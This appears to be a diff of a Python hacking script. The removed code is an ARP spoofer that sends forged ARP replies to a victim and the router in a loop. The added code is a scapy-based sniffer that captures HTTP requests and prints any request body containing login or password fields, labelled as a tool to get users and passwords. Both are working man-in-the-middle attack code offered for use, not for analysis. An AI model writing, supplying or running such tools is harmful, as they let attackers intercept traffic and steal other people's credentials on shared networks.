@@ -1,61 +1,69 @@
 #!/usr/bin/env python3
 
+import re
 import sys
-import time
 import signal
 import argparse
 import subprocess
 import scapy.all as scapy
+from scapy.layers import http
 from termcolor import colored
-
-def ctrl_exit(one, two):
-
-    print(colored("[!] exiting...", "red"))
-    sys.exit(1)
-
-signal.signal(signal.SIGINT, ctrl_exit)
 
 def arguments():
 
-    argument = argparse.ArgumentParser(description="ARP SPOOFER")
-    argument.add_argument('-gir', '--get_ip_router', action='store_true', dest='ip_router', help='Know your IP router and your HWaddres')
-    argument.add_argument('-i', '--ip', dest='ip', help='write the IP to spoof')
-    argument.add_argument('-r', '--router', dest='router', help='Write your router IP')
-    argument.add_argument('-hw', '--hwaddress', dest='hwaddress', help='Write yout HWaddress')
+    argument = argparse.ArgumentParser(description="Tool to get password and user of vulnweb")
+    argument.add_argument('-i', '--interface', dest='iface', help="write your iface")
+    argument.add_argument('-wmi', '--what_is_my_iface', action='store_true', dest='help_iface', help='it gets your iface')
 
     return argument.parse_args()
 
-def get_ip_router():
+def exit_ctrl(one, two):
 
-    command1 = "route -n | awk 'NR==3' | awk '{print $2}'"
-    ip = subprocess.run(command1, shell=True, capture_output=True, text=True)
+    print(colored(f"[!] Exiting...", "red"))
+    sys.exit(1)
 
-    command2 = "ifconfig | awk '/ether/' | awk '{print $2}'"
-    HWadd = subprocess.run(command2, shell=True, capture_output=True, text=True)
+signal.signal(signal.SIGINT, exit_ctrl)
 
-    return ip.stdout.strip(), HWadd.stdout.strip()
+def get_url(page):
 
-def spoof(ip, ip_spoof, hws):
+    return "https//" + page[http.HTTPRequest].Host.decode() + page[http.HTTPRequest].Path.decode()
 
-    spoofi = scapy.ARP(op=2, psrc=ip_spoof, pdst=ip, hwsrc=hws)
-    scapy.send(spoofi, verbose=False)
+def get_your_iface():
 
-def control_options(argm):
+    command = 'ifconfig'
+    interface = subprocess.run(command, shell=True, capture_output=True, text=True)
+    interface = interface.stdout
+    print(interface)
 
-    if argm.ip_router:
-        ip, hw = get_ip_router()
-        print(colored(f"[+] IP-Router {ip}  HWaddress {hw}", "magenta"))
-    else:
-        while True:
-            spoof(argm.router, argm.ip, argm.hwaddress)
-            spoof(argm.ip, argm.router, argm.hwaddress)
+def packet(pack):
 
-            time.sleep(2)
+    report_list = ["login", "pass", "name", "login"]
+
+    if pack.haslayer(http.HTTPRequest):
+        url = get_url(pack)
+        print(colored(f"[+] {url}", "green"))
+        if pack.haslayer(scapy.Raw):
+            request = pack[scapy.Raw].load.decode()
+            try:
+                for i in report_list:
+                    if i in request:
+                        print(colored(f"[+] Credentials {request}: ", "magenta"))
+                        break
+            except:
+                pass
+
+def sniff_packets(interface):
+
+    scapy.sniff(iface=interface, prn=packet, store=0)
 
 def main():
 
     argument = arguments()
-    control_options(argument)
+
+    if argument.help_iface:
+        get_your_iface()
+    else:
+        sniff_packets(argument.iface)
 
 if __name__ == "__main__":
     main()
